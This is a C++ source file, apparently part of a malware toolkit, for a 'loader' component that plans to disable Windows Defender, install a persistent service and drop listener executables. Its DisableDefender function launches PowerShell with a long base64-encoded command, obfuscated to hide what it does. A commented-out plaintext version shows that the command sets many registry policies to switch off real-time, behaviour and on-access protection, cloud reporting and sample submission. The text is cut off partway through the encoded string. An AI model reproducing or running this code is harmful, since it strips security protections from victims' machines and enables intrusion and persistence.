#include "loader.hpp"

std::string componentName = "loader";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + RunWhoami(), componentName);

	if (DisableDefender() != 0) {
		// disabling defender failed
	}

	// TODO: create working directory

	// TODO: create b64 config file

	// TODO: drop persistence and listener exes

	if (CreatePersistService() != 0) {
		// creating persistent service failed
	}

	// TODO: start service

	return 0;
}

int DisableDefender() {
	//std::map<LPCSTR, std::map<LPCSTR, DWORD>>::iterator outer;
	//std::map<LPCSTR, DWORD>::iterator inner;

	//for (outer = registryEntries.begin(); outer != registryEntries.end(); outer++) {
	//	for (inner = outer->second.begin(); inner != outer->second.end(); inner++) {

	//		LSTATUS s;
	//		HKEY key;

	//		s = RegCreateKeyExA(
	//			HKLM,
	//			outer->first,
	//			0,
	//			NULL,
	//			REG_OPTION_NON_VOLATILE,
	//			KEY_WRITE,
	//			NULL,
	//			&key,
	//			NULL
	//		);
	//		//s = RegOpenKeyExA(
	//		//	HKLM,
	//		//	outer->first,
	//		//	0,
	//		//	KEY_WRITE,
	//		//	&key
	//		//);
	//		if (s != ERROR_SUCCESS) {
	//			Log("[!] Opening key failed " + std::string(outer->first) + " " + std::string(inner->first) + ": " + std::to_string(GetLastError()), componentName);
	//		}
	//		else {
	//			Log("[*] Opened key " + std::string(outer->first) + " " + std::string(inner->first), componentName);
	//		}

	//		s = RegSetValueExA(
	//			key,
	//			inner->first,
	//			0,
	//			REG_DWORD,
	//			reinterpret_cast<BYTE *>(inner->second),
	//			sizeof(DWORD)
	//		);
	//		if (s != ERROR_SUCCESS) {
	//			Log("[!] Writing key failed " + std::string(outer->first) + " " + std::string(inner->first) + ": " + std::to_string(GetLastError()), componentName);
	//		}
	//		else {
	//			Log("[+] Wrote key " + std::string(outer->first) + " " + std::string(inner->first), componentName);
	//		}
	//	}
	//}

	Log("[*] Disabling defender thru registry.", componentName);
	std::string retStr = "";

	// source: https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
	HANDLE g_hChildStd_IN_Rd = NULL;
	HANDLE g_hChildStd_IN_Wr = NULL;
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_IN_Rd(static_cast<void*>(g_hChildStd_IN_Rd), CloseHandle);
	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_IN_Wr(static_cast<void*>(g_hChildStd_IN_Wr), CloseHandle);
	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_OUT_Rd(static_cast<void*>(g_hChildStd_OUT_Rd), CloseHandle);
	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_OUT_Wr(static_cast<void*>(g_hChildStd_OUT_Wr), CloseHandle);

	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
		Log("[!] DisableDefender StdoutRd CreatePipe: " + std::to_string(GetLastError()), componentName);
		return 1;
	}
		
	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
		Log("[!] DisableDefender Stdout SetHandleInformation: " + std::to_string(GetLastError()), componentName);\
		return 2;
	}
		
	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
		Log("[!] DisableDefender Stdin CreatePipe: " + std::to_string(GetLastError()), componentName);
		return 3;
	}
		
	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
		Log("[!] DisableDefender Stdin SetHandleInformation: " + std::to_string(GetLastError()), componentName);
		return 4;
	}
		
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;
	BOOL bSuccess = FALSE;

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	std::unique_ptr<void, decltype(&CloseHandle)> uphProcess(static_cast<void*>(piProcInfo.hProcess), CloseHandle);
	std::unique_ptr<void, decltype(&CloseHandle)> uphThread(static_cast<void*>(piProcInfo.hThread), CloseHandle);

	//std::wstring cmd =
	//	L"powershell.exe -Command "
	//	L"New-Item -Path \"HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\\" -Name \"Windows Defender\" -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableRoutinelyTakingAction\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableRealtimeMonitoring\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableSpecialRunningModes\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender\" -Name \"ServiceKeepAlive\" -Value 0 -Type DWORD -Force -ErrorAction Continue; "
	//	L"New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft' -Name \"Windows Defender\" -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableRoutinelyTakingAction\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableRealtimeMonitoring\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableSpecialRunningModes\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"ServiceKeepAlive\" -Value 0 -Type DWORD -Force -ErrorAction Continue; "
	//	L"New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name \"Spynet\" -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" -Name \"SpyNetReporting\" -Value 0 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" -Name \"SubmitSamplesConsent\" -Value 0 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"New-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\" -Name \"MRT\" -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\MRT\" -Name \"DontReportInfectionInformation\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name \"Signature Updates\" -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates\" -Name \"ForceUpdateFromMU\" -Value 0 -Type DWORD -Force -ErrorAction Continue; "
	//	L"New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name \"Real-Time Protection\" -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 -Type DWORD -Force -ErrorAction Continue; "
	//	L"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 -Type DWORD -Force -ErrorAction Continue; ";

	std::string cmd = "powershell.exe -encodedCommand TgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABXAG8AdwA2ADQAMwAyAE4AbwBkAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcACcAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAJwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABXAG8AdwA2ADQAMwAyAE4AbwBkAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAJwAgAC0ATgBhAG0AZQAgACcARABpAHMAYQBiAGwAZQBBAG4AdABpAFMAcAB5AHcAYQByAGUAJwAgAC0AVgBhAGwAdQBlACAAMQAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFcAbwB3ADYANAAzADIATgBvAGQAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAnACAALQBOAGEAbQBlACAAJwBEAGkAcwBhAGIAbABlAFIAbwB1AHQAaQBuAGUAbAB5AFQAYQBrAGkAbgBnAEEAYwB0AGkAbwBuACcAIAAtAFYAYQBsAHUAZQAgADEAIAAtAFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABXAG8AdwA2ADQAMwAyAE4AbwBkAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAJwAgAC0ATgBhAG0AZQAgACcARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAnACAALQBWAGEAbAB1AGUAIAAxACAALQBUAHkAcABlACAARABXAE8AUgBEACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEMAbwBuAHQAaQBuAHUAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBvAHcANgA0ADMAMgBOAG8AZABlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAEQAaQBzAGEAYgBsAGUAQQBuAHQAaQBWAGkAcgB1AHMAJwAgAC0AVgBhAGwAdQBlACAAMQAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFcAbwB3ADYANAAzADIATgBvAGQAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAnACAALQBOAGEAbQBlACAAJwBEAGkAcwBhAGIAbABlAFMAcABlAGMAaQBhAGwAUgB1AG4AbgBpAG4AZwBNAG8AZABlAHMAJwAgAC0AVgBhAGwAdQBlACAAMQAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFcAbwB3ADYANAAzADIATgBvAGQAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAnACAALQBOAGEAbQBlACAAJwBTAGUAcgB2AGkAYwBlAEsAZQBlAHAAQQBsAGkAdgBlACcAIAAtAFYAYQBsAHUAZQAgADAAIAAtAFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0ACcAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAJwAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAnACAALQBOAGEAbQBlACAAJwBEAGkAcwBhAGIAbABlAEEAbgB0AGkAUwBwAHkAdwBhAHIAZQAnACAALQBWAGEAbAB1AGUAIAAxACAALQBUAHkAcABlACAARABXAE8AUgBEACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEMAbwBuAHQAaQBuAHUAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAEQAaQBzAGEAYgBsAGUAUgBvAHUAdABpAG4AZQBsAHkAVABhAGsAaQBuAGcAQQBjAHQAaQBvAG4AJwAgAC0AVgBhAGwAdQBlACAAMQAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAnACAALQBOAGEAbQBlACAAJwBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACcAIAAtAFYAYQBsAHUAZQAgADEAIAAtAFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAJwAgAC0ATgBhAG0AZQAgACcARABpAHMAYQBiAGwAZQBBAG4AdABpAFYAaQByAHUAcwAnACAALQBWAGEAbAB1AGUAIAAxACAALQBUAHkAcABlACAARABXAE8AUgBEACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEMAbwBuAHQAaQBuAHUAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAEQAaQBzAGEAYgBsAGUAUwBwAGUAYwBpAGEAbABSAHUAbgBuAGkAbgBnAE0AbwBkAGUAcwAnACAALQBWAGEAbAB1AGUAIAAxACAALQBUAHkAcABlACAARABXAE8AUgBEACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEMAbwBuAHQAaQBuAHUAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAFMAZQByAHYAaQBjAGUASwBlAGUAcABBAGwAaQB2AGUAJwAgAC0AVgBhAGwAdQBlACAAMAAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAFMAcAB5AG4AZQB0ACcAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABTAHAAeQBuAGUAdAAnACAALQBOAGEAbQBlACAAJwBTAHAAeQBOAGUAdABSAGUAcABvAHIAdABpAG4AZwAnACAALQBWAGEAbAB1AGUAIAAwACAALQBUAHkAcABlACAARABXAE8AUgBEACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEMAbwBuAHQAaQBuAHUAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAUwBwAHkAbgBlAHQAJwAgAC0ATgBhAG0AZQAgACcAUwB1AGIAbQBpAHQAUwBhAG0AcABsAGUAcwBDAG8AbgBzAGUAbgB0ACcAIAAtAFYAYQBsAHUAZQAgADAAIAAtAFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABTAHAAeQBuAGUAdAAnACAALQBOAGEAbQBlACAAJwBEAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AJwAgAC0AVgBhAGwAdQBlACAAMQAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAJwAtAE4AYQBtAGUAIAAnAE0AUgBUACcAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAE0AUgBUACcAIAAtAE4AYQBtAGUAIAAnAEQAbwBuAHQAUgBlAHAAbwByAHQASQBuAGYAZQBjAHQAaQBvAG4ASQBuAGYAbwByAG0AYQB0AGkAbwBuACcAIAAtAFYAYQBsAHUAZQAgADEAIAAtAFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAnACAALQBOAGEAbQBlACAAJwBTAGkAZwBuAGEAdAB1AHIAZQAgAFUAcABkAGEAdABlAHMAJwAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFMAaQBnAG4AYQB0AHUAcgBlACAAVQBwAGQAYQB0AGUAcwAnACAALQBOAGEAbQBlACAAJwBGAG8AcgBjAGUAVQBwAGQAYQB0AGUARgByAG8AbQBNAFUAJwAgAC0AVgBhAGwAdQBlACAAMAAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAFIAZQBhAGwALQBUAGkAbQBlACAAUAByAG8AdABlAGMAdABpAG8AbgAnACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEMAbwBuAHQAaQBuAHUAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAUgBlAGEAbAAtAFQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACcAIAAtAE4AYQBtAGUAIAAnAEQAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAJwAgAC0AVgBhAGwAdQBlACAAMQAgAC0AVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAOwAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFIAZQBhAGwALQBUAGkAbQBlACAAUAByAG8AdABlAGMAdABpAG8AbgAnACAALQBOAGEAbQBlACAAJwBEAGkAcwBhAGIAbABlAE8AbgBBAGMAYwBlAHMAcwBQAHIAbwB0AGUAYwB0AGkAbwBuACcAIAAtAFYAYQBsAHUAZQAgADEAIAAtAFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABSAGUAYQBsAC0AVABpAG0AZQAgAFAAcgBvAHQAZQBjAHQAaQBvAG4AJwAgAC0ATgBhAG0AZQAgACcARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQ